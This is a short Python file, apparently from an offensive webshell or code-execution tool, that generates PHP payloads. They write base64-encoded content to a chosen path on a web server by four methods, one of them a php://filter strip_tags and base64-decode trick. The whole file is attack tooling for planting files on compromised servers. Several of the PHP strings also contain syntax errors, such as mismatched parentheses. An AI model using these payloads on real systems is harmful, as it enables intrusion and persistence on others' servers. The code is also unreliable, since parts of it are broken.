from libs.myapp import base64_encode

def get_php_write(web_file_path, result, write_method):

    php_code = ""
    if write_method == 1:
        php_code = f"print(file_put_contents(base64_decode('{base64_encode(web_file_path)}'), base64_decode('{result}')));"
    if write_method == 2:
        php_code = f"$n=base64_decode('{base64_encode(web_file_path)}');$f=fopen($n),'w+');print(fwrite($f, base64_decode('{result}')));fclose($f);"
    if write_method == 3:
        php_code = f"""
        $d=new DOMDocument();
        $d->loadHTML('{result}');
        print($d->saveHtmlFile("php://filter/string.strip_tags|convert.base64-decode/resource='{base64_encode(web_file_path)}'"));
        """
    if write_method == 4:
        php_code = f"$d=new SplFileObject(base64_decode('{base64_encode(web_file_path)}');print($d->fwrite(base64_decode('{result}'))); "

    return php_code
